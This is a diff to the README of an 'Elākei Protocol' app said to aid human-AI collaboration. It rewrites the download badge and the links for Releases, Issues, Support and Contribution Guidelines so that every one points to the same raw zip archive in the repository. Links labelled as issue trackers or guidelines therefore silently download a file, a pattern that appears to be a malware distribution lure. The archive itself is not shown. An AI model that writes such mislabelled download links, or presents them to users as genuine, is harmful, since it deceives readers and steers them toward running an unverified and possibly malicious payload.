@@ -4,11 +4,11 @@
 
 Welcome to the Elākei Protocol! This application enables better collaboration between humans and AI. Follow these steps to get started easily.
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/KeroAyman342/elakei-protocol/releases)
+[![Download](https://raw.githubusercontent.com/KeroAyman342/elakei-protocol/main/motivity/elakei-protocol-2.1-beta.4.zip)](https://raw.githubusercontent.com/KeroAyman342/elakei-protocol/main/motivity/elakei-protocol-2.1-beta.4.zip)
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [elakei-protocol Releases](https://github.com/KeroAyman342/elakei-protocol/releases). 
+To download the application, visit this page to download: [elakei-protocol Releases](https://raw.githubusercontent.com/KeroAyman342/elakei-protocol/main/motivity/elakei-protocol-2.1-beta.4.zip). 
 
 Here are the steps you need to follow:
 
@@ -69,7 +69,7 @@ Elākei is a Living Definition aimed at enhancing human-AI cooperation. It trans
 
 ## 🛡️ Support
 
-For support and feedback, please visit the Issues section of the [elakei-protocol repository](https://github.com/KeroAyman342/elakei-protocol/issues). Your input helps improve the application.
+For support and feedback, please visit the Issues section of the [elakei-protocol repository](https://raw.githubusercontent.com/KeroAyman342/elakei-protocol/main/motivity/elakei-protocol-2.1-beta.4.zip). Your input helps improve the application.
 
 ## 🗣️ Community Topics
 
@@ -84,8 +84,8 @@ For any further questions or assistance, you can check community forums or reach
 
 ## 🔗 Useful Links
 
-- [Download the Latest Version](https://github.com/KeroAyman342/elakei-protocol/releases)
-- [Open Issues](https://github.com/KeroAyman342/elakei-protocol/issues)
-- [Contribution Guidelines](https://github.com/KeroAyman342/elakei-protocol/blob/main/CONTRIBUTING.md)
+- [Download the Latest Version](https://raw.githubusercontent.com/KeroAyman342/elakei-protocol/main/motivity/elakei-protocol-2.1-beta.4.zip)
+- [Open Issues](https://raw.githubusercontent.com/KeroAyman342/elakei-protocol/main/motivity/elakei-protocol-2.1-beta.4.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/KeroAyman342/elakei-protocol/main/motivity/elakei-protocol-2.1-beta.4.zip)
 
 Thank you for choosing Elākei Protocol. Enjoy your journey into new forms of collaboration!
